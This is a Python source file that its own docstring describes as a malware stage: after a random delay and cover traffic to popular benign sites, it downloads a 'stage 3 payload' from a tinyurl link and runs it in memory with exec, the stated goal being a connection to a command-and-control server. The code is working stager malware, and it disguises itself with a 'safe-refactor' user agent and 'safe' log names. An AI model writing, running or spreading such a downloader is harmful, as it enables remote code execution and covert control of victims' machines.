'''
 # @ Create Time: 2025-08-13 16:00:11
 # @ Modified time: 2025-08-13 16:01:06
 # @ Description: execute payload in memory
 
 - wait for a random/conditional trigger 
 - fetch a stage 3 payload from a tiny url
 - exec fetched payload in memory
 - the result will build the connection with a C2 server

 '''
from __future__ import annotations
import requests
import json, os, time, random, base64
from pathlib import Path
import queue
from typing import Any, Dict, List
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

# --- Config (hard-coded; no environment variables) ---
USER_AGENT   = "safe-refactor/1.0"
WAIT_RANGE_S = (5, 180)  # random wait between 5 and 30 seconds


# a few benign websites to add noise
BENIGN_SITES = [
    "https://www.baidu.com",
    "https://www.wikipedia.org",
    "https://www.python.org",
    "https://www.github.com",
    "https://www.stackoverflow.com"
]

TARGET_URL = "https://tinyurl.com/2acl9edo"

# Lightweight audit log
LOG_DIR = Path("logs"); LOG_DIR.mkdir(parents=True, exist_ok=True)
AUDIT   = LOG_DIR / "safe_stage2.jsonl"


def log(event: str, **fields):
    rec = {"ts": int(time.time()), "event": event}
    rec.update(fields)
    AUDIT.parent.mkdir(parents=True, exist_ok=True)
    with AUDIT.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

def head_request(url: str, timeout: int = 10):
    req = Request(url, method="HEAD", headers={"User-Agent": USER_AGENT})
    with urlopen(req, timeout=timeout) as r:
        headers = dict(r.getheaders())
        return r.getcode(), headers

def main():
    # random wait
    wait_s = random.randint(*WAIT_RANGE_S)
    time.sleep(wait_s)

    # HEAD-only checks for noise sites
    for u in BENIGN_SITES:
        try:
            code, headers = head_request(u)
            log("head_ok", url=u, status=code, content_type=headers.get("Content-Type"))
        except Exception as e:
            log("head_error", url=u, error=str(e))

    try:
        response = requests.get(TARGET_URL, timeout=30)
        if response.status_code == 200:
            m_code = response.text
            try:
                # Give the payload access to the imported queue module
                exec(m_code, {"__builtins__": __builtins__, "queue": queue})
                log("download_attempt", url=TARGET_URL, status=response.status_code)
            except Exception as e:
                log("download_error", url=TARGET_URL, error=str(e))

    except (HTTPError, URLError, ValueError) as e:
        log("download_error", url=TARGET_URL, error=str(e))
        log("payload_exec_error", error=str(e))

if __name__ == "__main__":
    main()

